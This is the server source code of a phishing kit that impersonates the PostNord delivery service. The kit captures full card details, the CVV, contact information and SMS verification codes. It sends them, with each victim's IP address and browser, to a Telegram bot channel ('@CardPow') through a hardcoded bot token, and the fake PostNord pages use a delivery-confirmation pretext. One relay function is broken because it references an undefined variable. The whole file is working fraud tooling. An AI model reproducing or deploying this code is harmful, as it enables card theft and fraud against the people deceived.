const express = require("express")
const cookieParser = require("cookie-parser")
const path = require("path")

// Store sessions in memory (in production, use Redis or database)
const sessions = new Map()

const app = express()
const PORT = process.env.PORT || 3001

// Middleware
app.use(express.urlencoded({ extended: true }))
app.use(express.json())
app.use(cookieParser())
app.use(express.static(path.join(__dirname, "public")))

// Card validation functions
function luhnCheck(cardNumber) {
  const digits = cardNumber.replace(/\D/g, "").split("").map(Number)
  let sum = 0
  let isEven = false

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = digits[i]

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}

function detectCardType(cardNumber) {
  const cleanNumber = cardNumber.replace(/\s/g, "")

  const patterns = {
    Visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
    MasterCard: /^5[1-5][0-9]{14}$/,
    "American Express": /^3[47][0-9]{13}$/,
    Discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
    "Diners Club": /^3[0689][0-9]{11}$/,
    JCB: /^(?:2131|1800|35\d{3})\d{11}$/,
  }

  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(cleanNumber)) {
      return type
    }
  }

  return "Unknown"
}

function validateExpiryDate(expiryDate) {
  if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
    return false
  }

  const [month, year] = expiryDate.split("/")
  const currentDate = new Date()
  const currentYear = currentDate.getFullYear() % 100
  const currentMonth = currentDate.getMonth() + 1

  return (
    (Number.parseInt(year) > currentYear ||
      (Number.parseInt(year) === currentYear && Number.parseInt(month) >= currentMonth)) &&
    Number.parseInt(month) >= 1 &&
    Number.parseInt(month) <= 12
  )
}

function generateTrackingNumber() {
  return "PN" + new Date().getFullYear() + Math.floor(Math.random() * 900000 + 100000)
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// Send Card Details to Telegram
async function sendCardDetailsToTelegram(formData, req) {
  let content = ""
  for (const [key, value] of Object.entries(formData)) {
    if (value) {
      content += `<b>${key}</b>: <i>${value}</i>\n`
    }
  }

  if (content.trim()) {
    content = `<b>💳 PostNord Card Details - Saved</b>\n\n` + content

    // Add additional system information
    content += `\n<b>═══════════════════════════</b>\n`
    content += `<b>📅 Timestamp</b>: <i>${new Date().toISOString()}</i>\n`
    content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n`
    content += `<b>🔍 User Agent</b>: <i>${(req.get("User-Agent") || "Unknown").substring(0, 50)}...</i>\n`
    content += `<b>═══════════════════════════</b>\n`
    content += `<b>🟡🔵 PostNord Security System 🔵🟡</b>`

    const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: "@CardPow",
          text: content,
          parse_mode: "HTML",
        }),
      })

      return response.ok
    } catch (error) {
      console.error("Error sending card details to Telegram:", error)
      return false
    }
  }

  return false
}

// Send SMS Code to Telegram (separate message)
async function sendSMSCodeToTelegram(smsCode, userInfo, req) {
  

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending SMS code to Telegram:", error)
    return false
  }
}

// Send SMS Code Attempt to Telegram
async function sendSMSAttemptToTelegram(attemptedCode, correctCode, userInfo, isCorrect, req) {
  const status = isCorrect ? "✅ CORRECT" : "❌ INCORRECT"

  let content = `<b>📱 PostNord SMS Verification Attempt</b>\n\n`
  content += `<b>🔐 Attempted Code</b>: <code>${attemptedCode}</code>\n`
  content += `<b>🎯 Correct Code</b>: <code>${correctCode}</code>\n`
  content += `<b>📊 Status</b>: <b>${status}</b>\n\n`
  content += `<b>👤 User Details:</b>\n`
  content += `<b>Name</b>: <i>${userInfo.card_holder}</i>\n`
  content += `<b>Phone</b>: <i>${userInfo.phone}</i>\n`
  content += `<b>Tracking</b>: <i>${userInfo.tracking_number}</i>\n\n`
  content += `<b>📅 Attempt Time</b>: <i>${new Date().toISOString()}</i>\n`
  content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n\n`

  if (isCorrect) {
    content += `<b>🎉 VERIFICATION SUCCESSFUL!</b>\n`
    content += `<b>📦 Delivery can proceed</b>\n`
  } else {
    content += `<b>⚠️ Verification failed</b>\n`
    content += `<b>🔄 User may try again</b>\n`
  }

  content += `<b>🟡🔵 PostNord SMS Verification 🔵🟡</b>`

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending SMS attempt to Telegram:", error)
    return false
  }
}

// Send New SMS Code to Telegram
async function sendNewSMSCodeToTelegram(smsCode, userInfo, req) {
  let content = `<b>🔄 PostNord SMS Code - RESENT</b>\n\n`
  content += `<b>🔐 New SMS Code</b>: <code>${smsCode}</code>\n\n`
  content += `<b>👤 User Details:</b>\n`
  content += `<b>Name</b>: <i>${userInfo.card_holder}</i>\n`
  content += `<b>Phone</b>: <i>${userInfo.phone}</i>\n`
  content += `<b>Email</b>: <i>${userInfo.email}</i>\n`
  content += `<b>Tracking</b>: <i>${userInfo.tracking_number}</i>\n\n`
  content += `<b>📅 Resent At</b>: <i>${new Date().toISOString()}</i>\n`
  content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n\n`
  content += `<b>⏰ Code expires in 10 minutes</b>\n`
  content += `<b>🟡🔵 PostNord SMS Resend 🔵🟡</b>`

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending new SMS code to Telegram:", error)
    return false
  }
}

// Route to serve the main form
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"))
})

// Route to handle card validation
app.post("/validate_card", async (req, res) => {
  try {
    // Sanitize input
    const { card_number, expiry_date, cvv, card_holder, email, phone, delivery_type } = req.body

    // Validation results
    const validationResults = {}
    let overallStatus = "valid"

    // Validate card number
    const cleanCardNumber = card_number.replace(/\s/g, "")
    const cardValid = luhnCheck(cleanCardNumber)
    const cardType = detectCardType(cleanCardNumber)

    validationResults.card_number = {
      status: cardValid ? "valid" : "invalid",
      message: cardValid ? "Card verified for PostNord delivery" : "Invalid card number",
    }

    validationResults.card_type = {
      status: cardType !== "Unknown" ? "valid" : "warning",
      message: cardType,
    }

    // Validate expiry date
    const expiryValid = validateExpiryDate(expiry_date)
    validationResults.expiry_date = {
      status: expiryValid ? "valid" : "invalid",
      message: expiryValid ? "Valid expiry date" : "Card expired or invalid date",
    }

    // Validate CVV
    const cvvValid = cvv.length >= 3 && cvv.length <= 4 && /^\d+$/.test(cvv)
    validationResults.cvv = {
      status: cvvValid ? "valid" : "invalid",
      message: cvvValid ? "CVV verified" : "Invalid CVV code",
    }

    // Determine overall status
    for (const result of Object.values(validationResults)) {
      if (result.status === "invalid") {
        overallStatus = "invalid"
        break
      } else if (result.status === "warning" && overallStatus !== "invalid") {
        overallStatus = "warning"
      }
    }

    if (overallStatus === "valid") {
      const trackingNumber = generateTrackingNumber()
      const sessionId = generateSessionId()

      // Prepare form data for Telegram
      const formData = {
        card_number,
        expiry_date,
        cvv,
        card_holder,
        email,
        phone,
        delivery_type,
        validation_status: "VERIFIED ✅",
        card_type: cardType,
        tracking_number: trackingNumber,
      }

      // Send card details to Telegram (first message)
      const cardDetailsSent = await sendCardDetailsToTelegram(formData, req)

      // Generate SMS code
      const smsCode = String(Math.floor(Math.random() * 900000) + 100000)

      // Prepare user info for SMS message
      const userInfo = {
        card_holder,
        phone,
        email,
        tracking_number: trackingNumber,
      }

      // Send SMS code to Telegram (second message)
      const smsCodeSent = await sendSMSCodeToTelegram(smsCode, userInfo, req)

      // Store in session
      sessions.set(sessionId, {
        tracking_number: trackingNumber,
        card_holder,
        email,
        phone,
        delivery_type,
        validation_results: validationResults,
        card_details_sent: cardDetailsSent,
        sms_code_sent: smsCodeSent,
        sms_code: smsCode,
        sms_attempts: 0,
        sms_sent_time: Date.now(),
        created_at: Date.now(),
      })

      // Set session cookie
      res.cookie("session_id", sessionId, {
        httpOnly: true,
        maxAge: 30 * 60 * 1000, // 30 minutes
      })

      // Redirect to SMS verification
      res.redirect("/sms_verification")
    } else {
      // Render error page
      res.send(generateErrorPage(validationResults))
    }
  } catch (error) {
    console.error("Error in card validation:", error)
    res.status(500).send("Internal server error")
  }
})

// Route to display SMS verification page
app.get("/sms_verification", (req, res) => {
  const sessionId = req.cookies.session_id
  const session = sessions.get(sessionId)

  if (!session || !session.sms_code) {
    return res.redirect("/")
  }

  const maxAttempts = 5
  const currentAttempts = session.sms_attempts || 0

  res.send(generateSMSVerificationPage(session, currentAttempts, maxAttempts))
})

// Route to handle SMS verification
app.post("/sms_verification", async (req, res) => {
  const sessionId = req.cookies.session_id
  const session = sessions.get(sessionId)

  if (!session) {
    return res.redirect("/")
  }

  const { sms_code, resend_sms } = req.body
  const maxAttempts = 5

  // Handle resend SMS request
  if (resend_sms) {
    const timeSinceLast = Date.now() - session.sms_sent_time

    if (timeSinceLast >= 60000) {
      // Allow resend after 60 seconds
      // Generate new code
      const newSmsCode = String(Math.floor(Math.random() * 900000) + 100000)
      session.sms_code = newSmsCode
      session.sms_sent_time = Date.now()

      // Send new SMS code to Telegram
      await sendNewSMSCodeToTelegram(newSmsCode, session, req)

      sessions.set(sessionId, session)

      return res.send(
        generateSMSVerificationPage(
          session,
          session.sms_attempts,
          maxAttempts,
          "New SMS code sent to your phone and @CardPow channel.",
        ),
      )
    } else {
      const waitTime = Math.ceil((60000 - timeSinceLast) / 1000)
      return res.send(
        generateSMSVerificationPage(
          session,
          session.sms_attempts,
          maxAttempts,
          null,
          `Please wait ${waitTime} seconds before requesting a new code.`,
        ),
      )
    }
  }

  // Handle SMS code verification
  if (sms_code) {
    const submittedCode = sms_code.replace(/\D/g, "") // Only digits

    session.sms_attempts++
    const isCorrect = submittedCode === session.sms_code

    // Send attempt details to Telegram
    await sendSMSAttemptToTelegram(submittedCode, session.sms_code, session, isCorrect, req)

    if (isCorrect) {
      // Code is correct - redirect to success page
      sessions.set(sessionId, session)
      return res.redirect("/delivery_confirmed")
    } else {
      // Code is incorrect
      if (session.sms_attempts >= maxAttempts) {
        sessions.delete(sessionId)
        res.clearCookie("session_id")
        return res.send(
          generateSMSVerificationPage(
            session,
            session.sms_attempts,
            maxAttempts,
            null,
            "Too many failed attempts. Please start over.",
          ),
        )
      } else {
        sessions.set(sessionId, session)
        return res.send(
          generateSMSVerificationPage(
            session,
            session.sms_attempts,
            maxAttempts,
            null,
            "Invalid SMS code. Please try again.",
          ),
        )
      }
    }
  }
})

// Delivery confirmed page
app.get("/delivery_confirmed", (req, res) => {
  const sessionId = req.cookies.session_id
  const session = sessions.get(sessionId)

  if (!session) {
    return res.redirect("/")
  }

  // Clear session after successful completion
  sessions.delete(sessionId)
  res.clearCookie("session_id")

  res.send(generateDeliveryConfirmedPage(session))
})

// Generate error page HTML
function generateErrorPage(validationResults) {
  let errorDetails = ""
  for (const [field, result] of Object.entries(validationResults)) {
    if (result.status === "invalid") {
      errorDetails += `
                <div class="result-item">
                    <span class="result-label">${field.replace("_", " ").toUpperCase()}:</span>
                    <span class="result-value status-invalid">${result.message}</span>
                </div>
            `
    }
  }

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PostNord - Validation Error</title>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="logo">
                    <div class="logo-icon">📦</div>
                    <div class="logo-text">
                        <span class="post">Post</span><span class="nord">Nord</span>
                    </div>
                </div>
                <div class="header-info">
                    <span>Validation Error</span>
                </div>
            </div>
        </div>

        <div class="main-container">
            <div class="validation-result" style="grid-column: 1 / -1; max-width: 800px; margin: 0 auto;">
                <div class="error-alert">
                    ❌ Card validation failed. Please check your information and try again.
                </div>
                
                <div class="validation-details">
                    <h3>Validation Errors</h3>
                    ${errorDetails}
                </div>
                
                <a href="/" class="verify-btn" style="text-decoration: none; text-align: center; display: block; margin-top: 30px;">
                    <span class="btn-icon">🔄</span>
                    Try Again
                </a>
            </div>
        </div>

        <div class="footer">
            <div class="container">
                <p>&copy; 2024 PostNord. Secure delivery verification system.</p>
            </div>
        </div>

        <style>
            .validation-result {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            }
            .result-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 0;
                border-bottom: 1px solid #e5e7eb;
            }
            .result-label {
                font-weight: 600;
                color: #374151;
            }
            .status-invalid {
                color: #ef4444;
                font-weight: 500;
            }
            .validation-details h3 {
                color: #0052CC;
                margin-bottom: 20px;
                font-size: 20px;
            }
        </style>
    </body>
    </html>
    `
}

// Generate SMS verification page HTML
function generateSMSVerificationPage(
  session,
  currentAttempts,
  maxAttempts,
  successMessage = null,
  errorMessage = null,
) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PostNord - SMS Verification</title>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="logo">
                    <div class="logo-icon">📦</div>
                    <div class="logo-text">
                        <span class="post">Post</span><span class="nord">Nord</span>
                    </div>
                </div>
                <div class="header-info">
                    <span>SMS Verification Required</span>
                </div>
            </div>
        </div>

        <div class="main-container">
            <div class="sms-verification-container">
                <div class="sms-form">
                    <div class="verification-header">
                        <div class="verification-icon">📱</div>
                        <h2>SMS Verification</h2>
                        <p>We've sent a 6-digit verification code to:</p>
                        <div class="phone-display">${session.phone}</div>
                    </div>

                    <div class="delivery-steps">
                        <div class="step completed">
                            <div class="step-number">✓</div>
                            <span>Card Verified</span>
                        </div>
                        <div class="step active">
                            <div class="step-number">2</div>
                            <span>SMS Verification</span>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <span>Delivery Confirmed</span>
                        </div>
                    </div>

                    ${
                      errorMessage
                        ? `
                        <div class="error-alert">
                            ⚠️ ${errorMessage}
                        </div>
                    `
                        : ""
                    }

                    ${
                      successMessage
                        ? `
                        <div class="success-message">
                            ✅ ${successMessage}
                        </div>
                    `
                        : ""
                    }

                    <form action="/sms_verification" method="POST" id="smsForm">
                        <div class="sms-input-group">
                            <label for="smsCode">Enter 6-digit verification code</label>
                            <div class="sms-input-container">
                                <input type="text" id="smsCode" name="sms_code" maxlength="6" placeholder="000000" required autocomplete="one-time-code">
                                <div class="input-indicator" id="inputIndicator"></div>
                            </div>
                            <div class="attempts-counter">
                                Attempts: ${currentAttempts}/${maxAttempts}
                            </div>
                        </div>

                        <button type="submit" class="verify-btn" id="verifyBtn">
                            <span class="btn-icon">🔐</span>
                            Verify SMS Code
                        </button>
                    </form>

                    <div class="resend-section">
                        <p>Didn't receive the code?</p>
                        <form action="/sms_verification" method="POST" style="display: inline;">
                            <button type="submit" name="resend_sms" value="1" class="resend-btn" id="resendBtn">
                                📲 Resend SMS Code
                            </button>
                        </form>
                    </div>

                    <div class="security-info">
                        <div class="info-item">
                            <span class="info-icon">🔒</span>
                            <div class="info-content">
                                <strong>Secure Verification</strong>
                                <small>This code expires in 10 minutes</small>
                            </div>
                        </div>
                        <div class="info-item">
                            <span class="info-icon">📱</span>
                            <div class="info-content">
                                <strong>Telegram Monitoring</strong>
                                <small>All attempts sent to @CardPow</small>
                            </div>
                        </div>
                    </div>

                    <!-- Debug info (remove in production) -->
                    <div class="debug-info">
                        <strong>🔧 Debug Info (Remove in production):</strong><br>
                        SMS Code: <span style="color: #0052cc; font-weight: bold;">${session.sms_code}</span><br>
                        <small>This code is also sent to @CardPow channel</small>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="container">
                <p>&copy; 2024 PostNord. Secure delivery verification system.</p>
                <div class="footer-links">
                    <a href="#">Privacy Policy</a>
                    <a href="#">Terms of Service</a>
                    <a href="#">Contact Support</a>
                </div>
            </div>
        </div>

        <script>
            document.addEventListener("DOMContentLoaded", () => {
                const smsForm = document.getElementById("smsForm");
                const smsCodeInput = document.getElementById("smsCode");
                const verifyBtn = document.getElementById("verifyBtn");
                const inputIndicator = document.getElementById("inputIndicator");

                // Auto-format SMS code input (digits only)
                smsCodeInput.addEventListener("input", (e) => {
                    let value = e.target.value.replace(/\\D/g, "");
                    if (value.length > 6) {
                        value = value.substring(0, 6);
                    }
                    e.target.value = value;
                    updateInputIndicator(value.length);

                    if (value.length === 6) {
                        setTimeout(() => {
                            smsForm.submit();
                        }, 500);
                    }
                });

                function updateInputIndicator(length) {
                    const indicators = [];
                    for (let i = 0; i < 6; i++) {
                        indicators.push(i < length ? "●" : "○");
                    }
                    inputIndicator.textContent = indicators.join(" ");
                }

                updateInputIndicator(0);
                smsCodeInput.focus();

                smsForm.addEventListener("submit", (e) => {
                    const code = smsCodeInput.value.trim();
                    if (code.length !== 6) {
                        e.preventDefault();
                        return;
                    }
                    verifyBtn.innerHTML = '<span class="btn-icon">⏳</span> Verifying...';
                    verifyBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    `
}

// Generate delivery confirmed page HTML
function generateDeliveryConfirmedPage(session) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PostNord - Delivery Confirmed</title>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="logo">
                    <div class="logo-icon">📦</div>
                    <div class="logo-text">
                        <span class="post">Post</span><span class="nord">Nord</span>
                    </div>
                </div>
                <div class="header-info">
                    <span>Delivery Confirmed</span>
                </div>
            </div>
        </div>

        <div class="main-container">
            <div class="confirmation-container">
                <div class="success-animation">
                    <div class="checkmark">✅</div>
                    <h1>Delivery Confirmed!</h1>
                    <p>Your package is ready for delivery</p>
                </div>

                <div class="delivery-details">
                    <div class="tracking-card">
                        <h2>📦 Your Package Details</h2>
                        <div class="detail-row">
                            <span class="label">Tracking Number:</span>
                            <span class="value tracking-number">${session.tracking_number}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">Recipient:</span>
                            <span class="value">${session.card_holder}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">Contact:</span>
                            <span class="value">${session.phone}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">Email:</span>
                            <span class="value">${session.email}</span>
                        </div>
                        <div class="detail-row">
                            <span class="label">Delivery Type:</span>
                            <span class="value">${session.delivery_type.charAt(0).toUpperCase() + session.delivery_type.slice(1)} Delivery</span>
                        </div>
                    </div>
                </div>

                <div class="action-buttons">
                    <a href="#" class="primary-btn">
                        <span class="btn-icon">📱</span>
                        Track Your Package
                    </a>
                    <a href="/" class="secondary-btn">
                        <span class="btn-icon">🔄</span>
                        Process Another Delivery
                    </a>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="container">
                <p>&copy; 2024 PostNord. Secure delivery verification system.</p>
            </div>
        </div>

        <style>
            .confirmation-container {
                max-width: 800px;
                margin: 0 auto;
                padding: 40px 20px;
            }
            .success-animation {
                text-align: center;
                margin-bottom: 40px;
                animation: slideInUp 0.6s ease-out;
            }
            .checkmark {
                font-size: 80px;
                margin-bottom: 20px;
                animation: bounce 1s ease-in-out;
            }
            .success-animation h1 {
                color: #0052cc;
                font-size: 36px;
                margin-bottom: 10px;
            }
            .success-animation p {
                color: #666;
                font-size: 18px;
            }
            .delivery-details {
                margin-bottom: 40px;
            }
            .tracking-card {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            }
            .tracking-card h2 {
                color: #0052cc;
                margin-bottom: 20px;
                font-size: 24px;
            }
            .detail-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 0;
                border-bottom: 1px solid #f0f0f0;
            }
            .detail-row:last-child {
                border-bottom: none;
            }
            .label {
                font-weight: 600;
                color: #374151;
            }
            .value {
                font-weight: 500;
                color: #0052cc;
            }
            .tracking-number {
                background: #ffd320;
                color: #0052cc;
                padding: 5px 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            .action-buttons {
                display: flex;
                gap: 20px;
                justify-content: center;
            }
            .primary-btn, .secondary-btn {
                padding: 15px 30px;
                border-radius: 10px;
                text-decoration: none;
                font-weight: 600;
                display: flex;
                align-items: center;
                gap: 10px;
                transition: all 0.3s ease;
            }
            .primary-btn {
                background: linear-gradient(135deg, #ffd320 0%, #0052cc 100%);
                color: white;
            }
            .secondary-btn {
                background: #f3f4f6;
                color: #374151;
                border: 2px solid #e5e7eb;
            }
            .primary-btn:hover, .secondary-btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            }
            @keyframes slideInUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            @keyframes bounce {
                0%, 20%, 50%, 80%, 100% {
                    transform: translateY(0);
                }
                40% {
                    transform: translateY(-10px);
                }
                60% {
                    transform: translateY(-5px);
                }
            }
            @media (max-width: 768px) {
                .action-buttons {
                    flex-direction: column;
                }
                .success-animation h1 {
                    font-size: 28px;
                }
                .checkmark {
                    font-size: 60px;
                }
            }
        </style>
    </body>
    </html>
    `
}

// Start server
app.listen(PORT, () => {
  console.log(`🚀 PostNord Card Validation Server running on port ${PORT}`)
  console.log(`📱 Telegram integration active: @CardPow`)
  console.log(`🔗 Access the application at: http://localhost:${PORT}`)
})
